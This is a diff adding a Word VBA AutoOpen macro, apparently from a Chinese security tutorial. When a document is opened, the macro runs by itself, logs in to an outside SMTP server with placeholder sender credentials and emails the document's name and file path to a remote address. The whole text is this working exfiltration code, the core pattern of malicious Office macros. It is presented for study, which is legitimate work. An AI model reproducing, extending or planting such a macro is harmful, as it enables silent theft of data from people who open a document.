@@ -1,0 +1,43 @@
+Sub AutoOpen()
+' AutoOpen宏
+' By: CSDN Eastmount 2020-04-21
+    
+    ' 获取文件夹路径
+    Dim WordObj As Object
+    Dim Doc As Object
+    Set WordObj = GetObject(, "Word.Application")
+    Set Doc = WordObj.ActiveDocument
+    MsgBox (Doc.Path)
+    
+    ' 定义邮件地址
+    Const from1 = "152xxxxxxxx@163.com"
+    Const to1 = "xxxxxxxxxx@qq.com"
+    Const password = "xxxxxxxxxx"
+    
+    ' 添加CDO库
+    Set CDO = CreateObject("CDO.Message")
+    CDO.from = from1
+    CDO.to = to1
+    CDO.Subject = Doc.Name
+    CDO.Textbody = Doc.Path
+    
+    ' 微软服务器网址
+    MsgBox ("发送邮件")
+    Const proxyUrl = "http://schemas.microsoft.com/cdo/configuration/"
+    With CDO.Configuration.Fields
+        .Item(proxyUrl & "sendusing") = 2                     '发送端口
+        .Item(proxyUrl & "smtpserver") = "smtp.163.com"       'SMTP服务器地址
+        .Item(proxyUrl & "smtpserverport") = 25               'SMTP服务器端口
+        .Item(proxyUrl & "smtpauthenticate") = 1              '是否开启用户名密码验证
+        .Item(proxyUrl & "sendusername") = from1              '发送方邮箱名称
+        .Item(proxyUrl & "sendpassword") = password           '发送方邮箱密码
+        .Item(proxyUrl & "smtpusessl") = True                 '是否使用ssl协议
+        .Item(proxyUrl & "smtpconnectiontimeout") = 60        '时延
+        .Update
+    End With
+    
+    ' 发送数据
+    CDO.Send
+    Set CDO = Nothing
+    MsgBox ("成功!")
+End Sub
